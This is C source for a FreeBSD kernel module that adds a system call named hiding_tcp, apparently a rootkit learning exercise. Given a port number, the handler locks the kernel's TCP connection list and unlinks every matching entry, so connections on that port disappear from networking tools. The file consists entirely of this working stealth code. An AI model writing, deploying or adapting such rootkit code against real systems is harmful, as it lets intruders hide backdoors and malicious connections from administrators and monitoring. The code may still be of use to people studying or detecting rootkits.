#include <bsm/audit_kevents.h>

#include <sys/types.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/proc.h>
#include <sys/socket.h>
#include <sys/sysent.h>

#include <net/if.h>
#include <net/vnet.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

struct hiding_tcp_args {
	uint16_t port;
};

static int handler(struct thread *td, void *args) {
	struct hiding_tcp_args *uap;
	uap = (struct hiding_tcp_args *)args;

	uprintf("Attempting to hide TCP port %hu\n", uap->port);

	/*
		TCPセッション構造体リストを走査
		ポート番号でマッチ
		一致したものをリストから削除
	*/

	CURVNET_SET(vnet0);
	INP_INFO_WLOCK(&V_tcbinfo);

	struct inpcb *inp;
	CK_LIST_FOREACH(inp, V_tcbinfo.ipi_listhead, inp_list) {
		if(inp->inp_vflag & INP_TIMEWAIT)
			continue;

		INP_RLOCK(inp);

		if (uap->port == ntohs(inp->inp_lport)) {
			CK_LIST_REMOVE(inp, inp_list);
			uprintf("Hiding connections on TCP port :%hu\n", ntohs(inp->inp_lport));
		}

		INP_RUNLOCK(inp);
	}

	INP_INFO_WUNLOCK(&V_tcbinfo);
	CURVNET_RESTORE();

	return 0;
}

static int offset = NO_SYSCALL;

static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch(cmd) {
	case MOD_LOAD:
		uprintf("Loaded Hiding TCP syscall at offset %d\n", offset);
		break;
	case MOD_UNLOAD:
		uprintf("Unloaded Hiding TCP syscall\n");
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}

	return error;
}

static struct sysent hiding_tcp_sysent = {
	.sy_narg = 1,
	.sy_call = handler
};

SYSCALL_MODULE(hiding_tcp, &offset, &hiding_tcp_sysent, load, NULL);
